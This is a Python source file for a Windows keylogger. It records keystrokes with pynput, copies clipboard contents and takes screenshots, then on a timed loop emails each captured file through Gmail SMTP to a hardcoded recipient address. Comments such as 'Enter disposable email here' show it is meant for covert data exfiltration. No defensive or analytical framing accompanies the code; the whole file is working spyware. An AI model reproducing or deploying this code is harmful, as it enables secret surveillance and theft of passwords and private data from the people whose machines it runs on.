#Imports
#necessary for email and attachments with email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
  

#necessary for clipboard function
import win32clipboard
#for keylogging
from pynput.keyboard import Key, Listener
#for yime of iterations
import time

import getpass
from requests import get
#for screenshots
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
#names of files
keys_information = "key_log.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"

time_iteration = 30     #seconds
number_of_iterations_end = 2 #number of times 
#the program will run

email_address = "coding.texts123@gmail.com" # Enter disposable email here
password = "PASSWORD" # Enter email password here

username = getpass.getuser()

toaddr = "coding.texts123@gmail.com" # Enter the email address you want to send your information to

key = " " # Generate an encryption key from the Cryptography folder

file_path = "" # Enter the file path you want your files to be saved to
extend = ""#"\\"
file_merge = file_path + extend

# email controls
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com',587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

#send_email(keys_information, file_path + extend + keys_information, toaddr)

# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

#copy_clipboard()


# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

#screenshot()


number_of_iterations =0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations <= number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 3:
            count = 0
            write_file(keys)
            keys =[]
    #for the txt file
    def write_file(keys):
        
            for key in keys:
               with open(file_path + extend + keys_information, "a") as f: 
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                #elif k.find("Key") == -1:
                else:
                    f.write(k)
                    f.close()
    #the condition of stopping
    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "a") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
        send_email(keys_information, file_path + extend + keys_information, toaddr)
        copy_clipboard()
        send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)
        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration


count = 0
